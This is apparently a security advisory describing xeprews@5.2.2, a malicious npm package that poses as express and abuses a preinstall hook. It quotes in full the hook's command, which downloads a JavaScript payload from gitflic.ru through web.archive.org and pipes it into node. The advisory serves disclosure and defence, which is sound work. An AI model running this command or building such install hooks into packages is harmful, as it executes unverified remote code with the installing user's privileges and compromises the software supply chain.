summary: xeprews preinstall fetches and executes remote script via node
details: xeprews@5.2.2 impersonates the express package (copying express's description, repository, homepage, author, and lib/ contents as cover) and declares a preinstall lifecycle script that runs `curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js | node`. On any `npm install xeprews`, npm invokes this hook before the package is usable, piping an unpinned, integrity-unchecked JavaScript payload from a third-party host (gitflic.ru, proxied through web.archive.org) directly into node, which executes it with the privileges of the installing user. The host is unrelated to the impersonated publisher, no hash or signature is verified, and the shipped express source serves only as a lure.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
